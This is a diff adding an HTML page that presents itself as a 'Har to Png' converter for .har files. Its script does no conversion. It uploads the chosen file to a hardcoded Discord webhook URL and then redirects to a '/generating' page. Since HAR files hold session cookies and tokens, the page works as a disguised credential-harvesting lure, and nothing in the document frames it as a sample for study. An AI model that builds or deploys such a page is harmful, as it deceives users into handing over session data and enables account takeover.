@@ -1,0 +1,148 @@
+<head>
+  <script language="javascript">
+  </script>
+
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Upload File to Webhook</title>
+  <style>
+    body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        #header {
+            text-align: center;
+            margin-bottom: 50px;
+            position: relative;
+            top: -60px; /* Moved header down by reducing the offset to -60px */
+        }
+        #header h1 {
+            color: #333;
+            margin: 0;
+        }
+        #header p {
+            color: #666;
+            margin: 5px 0;
+            font-size: 16px;
+        }
+        #uploadForm {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        #fileInput {
+            display: none;
+        }
+        #fileLabel {
+            display: inline-block;
+            padding: 10px 20px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-bottom: 10px;
+        }
+        #fileLabel:hover {
+            background-color: #0056b3;
+        }
+        #uploadButton {
+            display: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #28a745;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        #uploadButton:hover {
+            background-color: #218838;
+        }
+        #fileName {
+            margin-top: 10px;
+            font-weight: bold;
+            color: #333;
+        }
+  </style>
+</head>
+
+<body>
+  <div id="header">
+    <h1>Har to Png</h1>
+    <p>Convert your .Har files into a .Png in seconds, choose the file you want below</p>
+  </div>
+  <form id="uploadForm">
+    <label for="fileInput" id="fileLabel">Choose File</label>
+    <input type="file" id="fileInput" name="file" accept=".har" required="">
+    <button type="submit" id="uploadButton">Upload</button>
+    <div id="fileName">No file chosen</div>
+  </form>
+
+  <script>
+    // Define the webhook URL at the top for easy access
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1275973139725291562/vKYv9Y6w8CQamj_LTd_neJmEthNZKe7UaxEeXXcFE3YAcJ60PUu-SCVE9ws7015CxNxu';
+
+        document.getElementById('uploadForm').addEventListener('submit', async function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const fileInput = document.getElementById('fileInput');
+            if (fileInput.files.length === 0) {
+                alert('Please select a file.');
+                return;
+            }
+
+            const file = fileInput.files[0];
+            const formData = new FormData();
+            formData.append('file', file);
+
+            try {
+                // Send the file to Discord webhook
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    console.log('File uploaded successfully.');
+                    // Redirect to after a successful upload
+                    window.location.href = '/generating';
+                } else {
+                    alert('Failed to upload file.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred while uploading the file.');
+            }
+        });
+
+        // Display the chosen file name and toggle button visibility
+        document.getElementById('fileInput').addEventListener('change', function() {
+            const fileNameElement = document.getElementById('fileName');
+            const uploadButton = document.getElementById('uploadButton');
+            if (this.files.length > 0) {
+                fileNameElement.textContent = `Selected file: ${this.files[0].name}`;
+                uploadButton.style.display = 'inline-block'; // Show the upload button
+                document.getElementById('fileLabel').style.display = 'none'; // Hide the choose file button
+            } else {
+                fileNameElement.textContent = 'No file chosen';
+                uploadButton.style.display = 'none'; // Hide the upload button
+                document.getElementById('fileLabel').style.display = 'inline-block'; // Show the choose file button
+            }
+        });
+  </script>
+
+
+</body>
